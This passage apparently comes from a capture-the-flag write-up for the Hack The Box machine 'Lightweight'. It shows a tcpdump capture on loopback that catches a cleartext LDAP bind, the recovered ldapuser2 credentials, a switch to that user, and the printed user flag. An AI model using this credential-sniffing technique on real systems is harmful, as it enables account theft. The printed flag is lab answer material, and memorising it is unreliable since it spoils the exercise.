#### 2.1. LDAP credentials

1) Trigger:
```
# http http://10.10.10.119/status.php >/dev/null
```


2) After a couple of minutes:
```
[10.10.14.11@lightweight ~]$ tcpdump -i lo -X
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
18:05:59.910239 IP lightweight.htb.50694 > lightweight.htb.ldap: Flags [S], seq 1578091163, win 43690, options [mss 65495,sackOK,TS val 3156183 ecr 0,nop,wscale 6], length 0
	0x0000:  4500 003c ea4c 4000 4006 276e 0a0a 0a77  E..<.L@.@.'n...w
	0x0010:  0a0a 0a77 c606 0185 5e0f c29b 0000 0000  ...w....^.......
	0x0020:  a002 aaaa 2930 0000 0204 ffd7 0402 080a  ....)0..........
	0x0030:  0030 28d7 0000 0000 0103 0306            .0(.........
18:05:59.910264 IP lightweight.htb.ldap > lightweight.htb.50694: Flags [S.], seq 3972059878, ack 1578091164, win 43690, options [mss 65495,sackOK,TS val 3156184 ecr 3156183,nop,wscale 6], length 0
	0x0000:  4500 003c 0000 4000 4006 11bb 0a0a 0a77  E..<..@.@......w
	0x0010:  0a0a 0a77 0185 c606 ecc0 d2e6 5e0f c29c  ...w........^...
	0x0020:  a012 aaaa 2930 0000 0204 ffd7 0402 080a  ....)0..........
	0x0030:  0030 28d8 0030 28d7 0103 0306            .0(..0(.....
18:05:59.910277 IP lightweight.htb.50694 > lightweight.htb.ldap: Flags [.], ack 1, win 683, options [nop,nop,TS val 3156184 ecr 3156184], length 0
	0x0000:  4500 0034 ea4d 4000 4006 2775 0a0a 0a77  E..4.M@.@.'u...w
	0x0010:  0a0a 0a77 c606 0185 5e0f c29c ecc0 d2e7  ...w....^.......
	0x0020:  8010 02ab 2928 0000 0101 080a 0030 28d8  ....)(.......0(.
	0x0030:  0030 28d8                                .0(.
18:05:59.910315 IP lightweight.htb.50694 > lightweight.htb.ldap: Flags [P.], seq 1:92, ack 1, win 683, options [nop,nop,TS val 3156184 ecr 3156184], length 91
	0x0000:  4500 008f ea4e 4000 4006 2719 0a0a 0a77  E....N@.@.'....w
	0x0010:  0a0a 0a77 c606 0185 5e0f c29c ecc0 d2e7  ...w....^.......
	0x0020:  8018 02ab 2983 0000 0101 080a 0030 28d8  ....)........0(.
	0x0030:  0030 28d8 3059 0201 0160 5402 0103 042d  .0(.0Y...`T....-
	0x0040:  7569 643d 6c64 6170 7573 6572 322c 6f75  uid=ldapuser2,ou
	0x0050:  3d50 656f 706c 652c 6463 3d6c 6967 6874  =People,dc=light
	0x0060:  7765 6967 6874 2c64 633d 6874 6280 2038  weight,dc=htb..8
	0x0070:  6263 3832 3531 3333 3261 6265 3164 3766  bc8251332abe1d7f
	0x0080:  3130 3564 3365 3533 6164 3339 6163 32    105d3e53ad39ac2
18:05:59.910321 IP lightweight.htb.ldap > lightweight.htb.50694: Flags [.], ack 92, win 683, options [nop,nop,TS val 3156184 ecr 3156184], length 0
	0x0000:  4500 0034 fa3f 4000 4006 1783 0a0a 0a77  E..4.?@.@......w
	0x0010:  0a0a 0a77 0185 c606 ecc0 d2e7 5e0f c2f7  ...w........^...
	0x0020:  8010 02ab 2928 0000 0101 080a 0030 28d8  ....)(.......0(.
	0x0030:  0030 28d8                                .0(.
```
Note: LDAP credentials `ldapuser2:8bc8251332abe1d7f105d3e53ad39ac2`


#### 2.2. User flag
```
[10.10.14.11@lightweight ~]$ su ldapuser2
Password:
[ldapuser2@lightweight 10.10.14.11]$ cat /home/ldapuser2/user.txt
8a866d3bb7e13a57aaeb110297f48026
```
